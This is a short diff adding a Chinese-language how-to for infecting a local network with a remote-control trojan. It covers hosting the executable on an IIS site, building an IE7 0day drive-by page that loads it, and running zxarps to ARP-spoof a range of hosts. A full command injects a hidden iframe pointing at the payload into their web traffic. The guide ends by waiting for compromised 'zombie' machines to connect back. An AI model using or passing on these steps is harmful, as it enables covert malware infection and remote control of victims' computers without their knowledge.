@@ -1,0 +1,18 @@
+首先配置远控小马  muma.exe
+
+搭建asp网站可以直接用ip访问的  iis默认网站下面那个即可
+没有网站的话  就用asp小旋风搭建一个 
+假设是 http://192.168.1.5/
+把 muma.exe放入站点根目录
+
+之后用网马生成器（如 IE7 XML 0day网马生成器）
+输入 http://192.168.1.5/muma.exe 生成 ieexp.html
+
+之后用zxarps挂马
+
+格式
+zxarps.exe -idx 0 -ip 192.168.1.100-192.168.1.200 -spoofmode 3 -port 80 -insert "<iframe src='http://192.168.1.5/ieexp.html' width=0 height=0>"
+
+之后等着肉鸡上线即是
+
+
